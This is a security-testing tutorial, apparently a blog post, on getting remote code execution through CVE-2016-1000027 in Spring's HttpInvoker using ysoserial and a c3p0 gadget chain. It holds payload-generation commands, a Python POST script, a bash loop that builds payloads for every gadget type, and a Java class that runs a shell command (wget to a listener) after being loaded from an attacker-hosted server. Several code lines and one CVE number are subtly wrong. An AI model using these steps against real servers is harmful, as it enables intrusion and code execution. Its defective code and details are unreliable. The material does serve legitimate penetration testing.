---
title: CVE-2016-1000027 with c3p0
---

# CVE-2016-1000027 with c3p0: remote code execution (RCE) via insecure Java Deserialization
### Introduction
CVE-2016-1000027 is an insecure Java deserialization vulnerability in Spring Framework Web.  Though detractors online characterize it as a feature rather than a bug, application security practitioners who dismiss this vulnerability out of hand do so attheir own peril. Many application security scanning tools, such as Metasploit, offer limited visibility and do not expose the full extent of the underlying risk. Some cases may require a closer look. The vulnerability is explained in depth in [a great 2021 article by Artem Smotrakov](https://blog.gypsyengineer.com/en/security/detecting-dangerous-spring-exporters-with-codeql.html), show-casing [a GitHub PoC](https://github.com/artem-smotrakov/cve-2016-1000027-poc) that relies on a second vulnerability to achieve remote code execution (RCE).

One notable feature of the vulnerability is that it was never fixed on the package level, as the vendor simply deprecated the entire vulnerable class branch (org.springframework.remoting) in the subsequent major release. This puts the onus on developers to refactor their code with a secure alternative – potentially a big lift. As such, there is an increased chance of finding it in live production environments even though the CVE is quite old.

The CVE does not affect the vast Spring Framework Web functionality. The vulnerability will only be exploitable in applications using HttpInvokerServiceExporter, SimpleHttpInvokerServiceExporter, or any other class that extends RemoteInvocationSerializingExporter as an HTTP handler for a service endpoint: white-box testers may simply search the code-base for these vulnerable classes.

Identifying the vulnerability from outside the perimeter is not always possible at a glance but any endpoint that passes raw btye-code or uses Content-Type <code>application/java-vm</code> or <code>application/octet-stream</code> should draw suspicion.


### Detection
The next step is to probe the endpoint with [ysoserial](https://github.com/frohoff/ysoserial). As the experienced applications security practitioner is doubtless aware, ysoserial is a well-established tool for insecure Java deserialization payload generation. Note that it works best with Java JDK 8, which may be installed alongside othernewer JDKs. One approach is to start with the URLDNS payload type, which tries to elicit a DNS lookup from the server, in conjunction with a DNS/HTTP listener like [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [interact.sh](https://github.com/projectdiscovery/interactsh).

First, generate the payload.

<code>java -jar ysoserial-all.jar URLDNS http://<DNS_listener> > payload.bin</code>

Though JDK8 is recommended, the payload may also be generated on newer versions of Java like so:

<code>java -jar ysoserial-all.jar URLDNS http://<DNS_listener> > payload.bin</code>

Then, send the payload in the body of a POST request to the target endpoint, perhaps using a simple python script:

```python
#!/usr/bin/python3
import requests
# REPLACE WITH TESTING URL
url = "http://<server/<vulnerable_service>"
# PROXIES FOR ROUTING TRAFFIC THROUGH BURP OR SIMILAR TOOL -- OPTIONAL
proxies = {"http": "http://localhost:8080", "https": "https://localhost:8080"}
with open(r"payload.bin", 'rb') as f:
payload = f.read()
headers = {"Content-Type": "application/x-java-serialized-object", "Accept=Encoding": "gzip"}
res = requests.post(url, headers=headers, data=payload, proxies=proxies, verify=False)
print(res.text)
```

The in-band response will probably be HTTP 500 no matter what, but if the payload prompts an out-of-band signal from the server, then CVE-2016-1000027 is exploitable in the application.

### Exploitation
Coercing an out-of-band from an application server is itself already a serious security violation, but the potential damage is far more severe depending on what Java dependencies are available. The payload provided in the GitHub PoC relies on a gadget chain in CommonsCollections5 that leverages CVE-2015-7501 to achieve remote code execution (RCE). Unlike CVE-2026-1000027, this vulnerability is easily remediated via patch, so while there certainly are many unpatched versions in the wild, the chances of finding one are lower. White-box testers may observe that such payloads cause the following error in the applications logs:

<code>org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [serviceExporter] in context with path [/BasePath] threw exception 

java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InvokerTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.</code>

Though the error cites a compile-time control, remote code execution may still be possible if any other unsafe libraries are lurking in the classpath. A common next-step is to generate payloads for every ysoserial payload type. Many online tools, such as Metasploit's ysoserial payload exploit, perform this simple test but it may be easier to conduct with bash:

```bash
#!/bin/bash
mkdir payloads
declare -a payload_types=("AspectJWeaver" "BeanShell1" "C3P0" "Click1" "Clojure" "CommonsBeanutils1" "CommonsCollections1" "CommonsCollections2" "CommonsCollections3" "CommonsCollections4" "CommonsCollections5" "CommonsCollections6" "CommonsCollections7" "FileUpload1" "Groovy1" "Hibernate1" "Hibernate2" "JBossInterceptors1" "JRMPClient" "JRMPListener" "JSON1" "JavassistWeld1" "Jdk7u21" "Jython1" "MozillaRhino1" "MozillaRhino2" "Myfaces1" "Myfaces2" "ROME" "Spring1" "Spring2" "URLDNS" "Vaadin1" "Wicket1")

# TRY TO ELLICIT A SIGNAL FROM THE SERVER USING nslookup
# ALTERNATIVELY, INSERT ANY OTHER COMMAND THAT MAY BE RELEVANT TO THE TESTING METHODOLOGY
command="nslookup <DNS_listener>"
for payload_type in "${payload_types{@}}"; do
	java -jar ysoserial-all.ja "$payload_type" "$command" > "./payloads/nslookup_$payload_type"
done
```

Black-box testers should try to elicit another signal from the application server in the form of a DNS lookup or HTTP request with commands like <code>nslookup</code> or <code>wget</code> as shown in the example above. White-box testers may prefer commands like <code>touch</code> and will want to check the server logs to see how the application handles the payloads. The advantage of this approach are that is fast, easy, and doesn't require much thinking or analysis. The problem, especially for black-box testers, is that not all ysoserial payload types take the same arguments. Some of the more specialized ones may be generated incorrectly or not at all, without the tester's knowledge. [Metasploit's own documentation](https://docs.metasploit.com/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html) belies this issue with error messages in their exploit's output that indicate that several payload types could not be generated. Discounting all these payload types entirely is a mistake that may leave certain risks undetected.

Instead of using brute-force, white-box testers would do better to inspect the application WAR for the JARs in its classpath: <code>jar tf applcation.war.</code> Then they can cross-reference with ysoserial's list of payload prerequisites to identify an appropriate payload type:

<code>java -jar ysoserial-all.jar</code>

Consider the C3P0 exploit, which chains gadgets in c3p0.jar and mchange-commons-java.jar to execute remote byte-code. White-box testers who have generated their payloads naively as shown above may clue into the flaws in their C3P0 payloads by looking for errors from C3P0.jar in the
application logs:

<code>org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [serviceExporter] in context with path [/BasePath] threw exception java.io.InvalidObjectException: Failed to acquire the Context necessary to lookup an Object: javax.naming.NamingException: Could not resolve Reference to Object! [Root exception is java.net.MalformedURLException: no protocol: wget https]
 at 
com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized.getObject(ReferenceIndirector.java:125)
 at
com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase.readObject(PoolBackedDataSourceBase.java:211)
</code>

While this error seems to indicate failure, it is actually a strong sign that RCE is possible with the proper set-up. A [detailed article by Hans-Martin Münch on the Mogwai Labs blog](https://mogwailabs.de/en/blog/2025/02/c3p0-you-little-rascal/) recaps [Moriz Blecher's well-known research](https://raw.githubusercontent.com/mbechler/marshalsec/refs/heads/master/marshalsec.pdf) presenting the exploit.

First, write a simple Java class which executes a system command in the constructor. The example provided below is a slight modification of the class on the Mogwai Labs blog, geared towards black-box testers:

```java
package javatest;
public class Exploit {
	public Exploit() {
	try {
		//Set the malicious shell command here (below is just one example)
		Runtime.getRuntime().exec("wget http://<dns_listener>");
	} catch(Exception E) {
		e.printStackTrace();
	}
}
```

Compile the exploit code: <code>javac Exploit.java</code>

Host the .java and .class files on a server that the target application can reach. Make sure that they are saved at <code><web root>/<package_name>/<class_name></code>.

Pass the URL to the web root of the exploit server and the exploit class name to ysoserial to generate the payload:

<code>java -jar ysoserial-all.jar C3P0 http://<web_root>:<package>.<Class> > c3p0.bin </code>

Send the payload to the vulnerable endpoint, as was done with the URLDNS detection payload.

Verify whether the payload is executed successfully. For this example, the DNS listener should pick up a DNS lookup, this time accompanied by an
HTTP request with the User-agent header set to wget.

### Conclusion
Application security scanners and testing tools often prove temperamental. Sometimes, they may present too much information and other times, too little, such that it can be difficult to know if they are working effectively. Application security testers should keep a watchful eye open for error messages or odd-looking payloads or HTTP requests that might point to gaps in coverage. With luck, they may also point the way to a significant finding.
